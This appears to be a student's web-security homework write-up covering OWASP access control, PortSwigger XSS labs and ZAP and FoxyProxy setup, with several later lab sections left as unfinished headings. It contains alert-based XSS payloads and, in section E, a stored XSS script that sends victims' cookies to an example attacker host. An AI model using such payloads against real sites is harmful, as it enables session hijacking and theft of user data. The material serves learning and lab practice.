 # X) Read/Watch/Listen & Summarize

**Objective**
- A few bullet points per section is enough to summarize
- Add your own observation, question or idea


## X.1) [OWASP A01:2021](<https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/index.html>) - Broken Access Control
**Common access control vulnerabilities:**
- Violation of the principle of least privilege
- Bypassing access control checks with URL tampering
- Insecure direct object references
- Abusing JWT
- CORS misconfiguration


## X.2) PortSwigger Academy
[IDOR](<https://portswigger.net/web-security/access-control/idor>)
- a.k.a Insecure Direct Object References
- A vulnerability that arises from accessing objects directly with user-supplied input
- Most commonly associated with horizontal privilege escalation
 

[Path Traversal](<https://portswigger.net/web-security/file-path-traversal>)
- This type of vulnerability arises when a web server retrieves _files_ based on a _filename_ **appended** to a **base file path**
- Say a web server is serving content from `/home/webUser/content/*`, this is the base file path!
- If no controls are in place, one could read files from the home directory by tampering with the URL and replacing allowed file, say `file1`, with `../secretFile.txt`
  - Simply put: `/home/webUser/content/file1` now becomes `/home/webUser/secretFile`


[Cross-site scripting (XSS)](<https://portswigger.net/web-security/cross-site-scripting>)
- This vulnerability allows an attacker to inject malicious scripts into a trusted site, causing the victim’s browser to execute them as if they were legit. Leading to the attacker gaining the same access rights as the victim user.
3 main types:
1. Reflected XSS
   - The malicious script comes from the current HTTP request
3. Stored XSS
   - The malicious script comes from a website's database
   - The data is then included in later HTTP responses
5. DOM-based XSS
   - The vulnerability exists in client-side code, rather than server-side

How to prevent
- Filter user input as strictly as possible
- Encode user-controllable data in HTTP responses
- Use appropriate response headers suchs as `Content-Type` and `X-Content-Type-Options` to ensure browsers interpret responses as intended
- Content Security Policy (CSP) to reduce severity of any XSS vulnerability that still occur






------







# A) Totally Legit Certificate
**Objective**
- Install OWASP ZAP
- Generate a CA-certificate and install it on your browser
- Set ZAP as a proxy in your browser
- Set ZAP to capture also pictures
- Show that the requests appear in the ZAP interface


## Zed Attack Proxy
What is ZAP?
- Free, open-source penetration testing tool
- Specifically for testing web applications
- [Source](<https://www.zaproxy.org/getting-started/>)

Install and start it on Kali:
```bash
$ sudo apt install zaproxy
$ zaproxy
```
From this point on there's two ways we can go about this. Because ZAP [generates](<https://www.zaproxy.org/docs/desktop/addons/network/options/servercertificates/#generate>) a Root CA certificate for us, we can either:
1. Use the cert automatically
or
2. Import the cert to our browser

The first option is perfect for quickly testing a website or for one-offs. We do this by launching the browser through ZAP like so:

<img width="1635" height="1086" alt="2026-04-16-23:30:43" src="https://github.com/user-attachments/assets/13f686e1-11c5-4191-9d6d-67da36ef3af8" />


In order to capture pictures, one must: --> `Ctrl+Alt+O` --> type "display" in the search bar --> select the option --> check the selection on "Process images in HTTP requests/responses".


Back on the ZAP interface we can see all the requests and replies:

<img width="1911" height="1129" alt="2026-04-17-17:19:36" src="https://github.com/user-attachments/assets/2b1233fe-4107-49f5-a330-79ed6626d978" />


The second method you're going to see next!




-------






# B) FoxyProxy
**Objective**
- Install FoxyProxy standard
- Add ZAP as a proxy to it

## Setting up
Open up the extensions-manager in your browser, search for "foxyproxy standard" and lastly add it to firefox.

**Q:** What is FoxyProxy?

**A:** A proxy manager, especially useful when you have multiple proxies


Because we want foxyproxy to manage what gets proxied and where, we're now going use the second method of setting up ZAP:

In ZAP:
 - `Ctrl+Alt+O` --> `Network` --> `Server Certificates` --> then click `save` and specify where to save it
 - This will export the Root CA certificate locally

In Firefox:
 - Open `Settings` --> `Privacy & Security` --> `View Certificates` --> `Authorities` --> `Import` --> "Trust this CA to identify websites"
 - This will import the cert to your browser


Once we have that sorted we'll add the ZAP config to foxyproxy
<img width="1753" height="612" alt="2026-04-17-18:47:46" src="https://github.com/user-attachments/assets/c806a8ba-fa2a-463b-adad-30644d276991" />


We then pin the extension to our tab bar so that we can change settings on the go

<img width="481" height="592" alt="2026-04-17-19:09:33" src="https://github.com/user-attachments/assets/6b420978-3820-4800-b6c7-3d30acbd0af3" />

1. If we enable `ZAP`, everything gets proxied through => zaproxy
2. If we enable `Proxy by Patterns`, only portswigger.net and related domains goes through (for now)
3. If we disable it nothing will be proxied

Let's showcase quickly that it works.


### Exhibit A - ZAP is on
I browsed to `terokarvinen.com` and `archive.org` and we can see it in the output (not launching any spiders or attacks, just normal browsing)

<img width="1621" height="297" alt="2026-04-18-13:42:54" src="https://github.com/user-attachments/assets/72a5012a-3a8f-4f94-8c05-3e127e77dfcf" />


### Exhibit B - Proxy by pattern is on
**1. Browse to a random site**
<img width="591" height="370" alt="2026-04-18-13:48:16" src="https://github.com/user-attachments/assets/055b1749-741d-44ef-8490-6d0846287481" />

**2. Browse to target**
<img width="568" height="379" alt="2026-04-18-13:48:37" src="https://github.com/user-attachments/assets/41ae50dc-fc69-4957-8573-772f3cea7b8f" />

**3. Target matches the pattern and flows through to ZAP**
<img width="799" height="172" alt="2026-04-18-13:49:26" src="https://github.com/user-attachments/assets/5a58f78f-fd84-4f80-99ab-e35873036619" />


Let the timestamps serve as adequate proof that it works!








--------








# C) PortSwigger Labs: [Reflected XSS](<https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded>)
**Description**
- Lab contains a simple reflected cross-site scripting vulnerability in the search functionality

**Objective**
- Perform a cross-site scripting attack that calls the `alert` function


This one is pretty simple as it's just demonstrating the basic logic behind the vulnerability. 

We first test that the webpage is vulnerable by using a very basic HTML tag and insert the following:
```html
<b>test</b>
```
Which returns a bolded "test":

<img width="760" height="223" alt="2026-04-19-15:40:56" src="https://github.com/user-attachments/assets/5800f8fa-f743-4bbc-9a62-b5c4b7fd3a62" />


We now suspect that the page is vulnerable to further exploits as the input is not handled correctly.

We exploit this by typing the following into the search field:
```html
<script>alert('gotcha')</script>
```
Press enter => script runs and we get the alert.

<img width="604" height="231" alt="2026-04-19-15:43:41" src="https://github.com/user-attachments/assets/ce64f076-7419-4329-a15c-1b61705e367d" />

The URL looks like:
```url
https://0aa0002804585a3d810525d8002a00fe.web-security-academy.net/?search=%3Cscript%3Ealert(%27gothca%27)%3C%2Fscript%3E
```

Notice the last part:
```url
/?search=%3Cscript%3Ealert(%27gothca%27)%3C%2Fscript%3E
```
The browser thinks that it's totally legit, as it's coming from a trusted source, so it executes the code. If we were to get a victim to use this URL, the "payload" would execute in their browser.

--------






# D) PortSwigger Labs: [Stored XSS](<https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded>)
**Description**
- Lab contains a stored cross-site scripting vulnerability in the comment functionality

**Objective**
- Submit a comment that calls out the `alert` function when the blog post is viewed


Recall that in `stored XSS` the malicious script comes from the website's database. In this case the provided comment is not validated or encoded properly, so we can type almost anything we'd like and the website will store it as is in the database, everytime someone visits the blog post and the comments are loaded the script will run.

We type in the following:
```html
<script>alert('takeover')</script>
```
And post the comment.

Now every time that specific blog post is opened:

<img width="841" height="808" alt="2026-04-19-13:01:07" src="https://github.com/user-attachments/assets/627d2b60-0831-4cd7-9974-ab6b078cf24e" />


<img width="728" height="358" alt="2026-04-19-13:01:14" src="https://github.com/user-attachments/assets/cf11d6b9-2e32-4122-9a23-1d787d25e91f" />





--------




# E) xplain
**Objective**
- Explain using an example how an attacker might benefit from XSS


Let's build on the previous task and say a website is vulnerable to cross-site scripting, specifically the comment section. An attacker can utilize this by posting the following comment:
```html
<script>
  var img = new Image();
  img.src = 'http://cookiemonster.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
</script>
```
This is a `Stored XSS attack`, as the malicious script is now stored in the websites database. When users visit the webpage where the **contaminated database record** is loaded, the script is run, effectively stealing their cookie. This is active exfiltration, as the script grabs the cookie and physically sends it to an attackers server.

Depending on the extracted cookie, and attacker might be able to 
- Hijack the session (import the cookie into their own browser and send requests with it, impersonating the victim user)
- Access sensitive data


Source can be found [here](<https://eitca.org/cybersecurity/eitc-is-wapt-web-applications-penetration-testing/web-attacks-practice/http-attributes-cookie-stealing/examination-review-http-attributes-cookie-stealing/how-can-cross-site-scripting-xss-attacks-be-used-to-steal-cookies/>) (original example modified).





--------






# F) PortSwigger Labs - [Simple Path Traversal](<https://portswigger.net/web-security/file-path-traversal/lab-simple>)
**Description**
- Lab contains a path traversal vulnerability in the display of product images

**Objective**
- Retrieve contents of the `/etc/passwd` file








-----







# G) [Path Traversal 2](<https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass>)








------








# H) [Non-recursive Path Traversal](<https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively>)








------






# I) [IDOR](<https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references>)









---------








# J) Pencode
**Objective**
- Install [pencode](<https://github.com/ffuf/pencode>)
- Encode a string with it










------









# K) Mitmproxy
**Objective**
- Install Mitmproxy
- Showcase it in the terminal
- Enable TLS-decryption
- Pick a GET-request from the history, modify it, and resend it
